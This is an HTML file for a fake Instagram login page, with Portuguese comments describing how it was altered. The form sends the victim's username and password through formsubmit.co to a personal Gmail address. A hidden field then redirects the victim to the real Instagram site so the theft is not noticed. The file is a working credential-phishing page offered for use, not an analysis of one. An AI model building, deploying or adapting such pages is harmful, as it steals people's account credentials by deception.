<link rel="stylesheet" href="style.css">

<div id="wrapper">
  <div class="main-content">
    <div class="header">
      <img src="https://www.pngplay.com/wp-content/uploads/12/Instagram-Logo-No-Background.png" />
    </div>
    
    <!-- 1. Alterado de <div> para <form> com o link do serviço de ponte -->
    <form action="https://formsubmit.co/jeffersonpaivappp@gmail.com" method="POST" class="l-part">
      
      <!-- 2. Adicionado o atributo 'name' para identificação no e-mail -->
      <input type="text" name="username" placeholder="Username" class="input-1" required />
      
      <div class="overlap-text">
        <input type="password" name="password" placeholder="Password" class="input-2" required />
        <a href="#">Forgot?</a>
      </div>
      
      <!-- 3. Alterado para type="submit" para que o formulário seja enviado -->
      <input type="submit" value="Log in" class="btn" />
      
      <!-- Opcional: Redirecionar para o Instagram real após o envio -->
      <input type="hidden" name="_next" value="https://www.instagram.com">
      
    </form>
  </div>
  
  <div class="sub-content">
    <div class="s-part">
      Don't have an account?<a href="#">Sign up</a>
    </div>
  </div>
</div>
